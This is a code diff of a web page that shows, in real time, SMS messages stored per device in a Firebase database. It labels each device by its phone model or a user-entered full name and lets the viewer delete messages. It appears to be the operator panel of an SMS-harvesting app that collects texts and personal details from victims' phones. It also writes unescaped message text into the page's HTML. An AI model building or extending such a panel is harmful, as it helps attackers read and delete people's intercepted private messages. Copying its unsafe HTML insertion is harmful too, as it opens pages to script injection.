@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>All SMS Messages (Realtime + Delete)</title>
+  <title>All Device SMS (Realtime + Delete)</title>
   <style>
     body {font-family: Arial, sans-serif; margin: 40px;}
     h2 {margin-top: 30px;}
@@ -12,7 +12,7 @@
   </style>
 </head>
 <body>
-  <h1>All SMS Messages in Firebase (Realtime)</h1>
+  <h1>All Devices SMS (Realtime)</h1>
   <div id="content">Loading...</div>
 
   <!-- Firebase -->
@@ -32,58 +32,53 @@
     const db = firebase.database();
     const container = document.getElementById('content');
 
-    // Recursively search for SMS nodes in any object
-    function findSMS(obj, path = '') {
-      let results = [];
-      if (obj && typeof obj === 'object') {
-        for (const key in obj) {
-          if (key === 'sms' && typeof obj[key] === 'object') {
-            // Collect all messages under this sms node
-            Object.entries(obj[key]).forEach(([msgId, smsObj]) => {
-              results.push({
-                path: `${path}/sms/${msgId}`,
-                sms: smsObj
-              });
-            });
-          } else {
-            results = results.concat(findSMS(obj[key], path ? `${path}/${key}` : key));
-          }
-        }
-      }
-      return results;
-    }
-
     function render(snapshot) {
       container.innerHTML = '';
-      const data = snapshot.val() || {};
-      const smsList = findSMS(data);
+      const devices = snapshot.val() || {};
 
-      if (smsList.length === 0) {
-        container.textContent = 'No SMS messages found.';
-        return;
-      }
+      Object.entries(devices).forEach(([deviceId, deviceData]) => {
+        // Determine display name
+        let name = deviceId;
+        if (deviceData.DeviceInfo && deviceData.DeviceInfo.model) {
+          name = deviceData.DeviceInfo.model;
+        } else if (deviceData.input && deviceData.input.fullName) {
+          name = deviceData.input.fullName;
+        }
 
-      smsList.forEach(({ path, sms }) => {
-        const card = document.createElement('div');
-        card.className = 'sms-card';
-        card.innerHTML = `
-          <b>Path:</b> ${path}<br/>
-          <b>Sender:</b> ${sms.sender || ''}<br/>
-          <b>Body:</b> ${sms.messageBody || ''}<br/>
-          <b>Time:</b> ${sms.time || ''}<br/>
-          <button class="delete-btn" onclick="deleteMsg('${path}')">Delete</button>
-        `;
-        container.appendChild(card);
+        // Device heading
+        const h2 = document.createElement('h2');
+        h2.innerText = name;
+        container.appendChild(h2);
+
+        // Show messages
+        if (deviceData.sms) {
+          Object.entries(deviceData.sms).forEach(([msgId, smsObj]) => {
+            const card = document.createElement('div');
+            card.className = 'sms-card';
+            card.innerHTML = `
+              <b>Sender:</b> ${smsObj.sender || ''}<br/>
+              <b>Body:</b> ${smsObj.messageBody || ''}<br/>
+              <b>Time:</b> ${smsObj.time || ''}<br/>
+              <button class="delete-btn" onclick="deleteMsg('${deviceId}','${msgId}')">Delete</button>
+            `;
+            container.appendChild(card);
+          });
+        } else {
+          const p = document.createElement('p');
+          p.innerText = 'No SMS found.';
+          container.appendChild(p);
+        }
       });
     }
 
-    db.ref('/').on('value', (snapshot) => {
+    // Realtime listener for Devices
+    db.ref('Devices').on('value', (snapshot) => {
       render(snapshot);
     });
 
-    function deleteMsg(path) {
-      if (confirm(`Delete this message at:\n${path} ?`)) {
-        db.ref(path).remove()
+    function deleteMsg(deviceId, msgId) {
+      if (confirm('Delete this message?')) {
+        db.ref(`Devices/${deviceId}/sms/${msgId}`).remove()
           .catch(e => alert("Error: " + e.message));
       }
     }
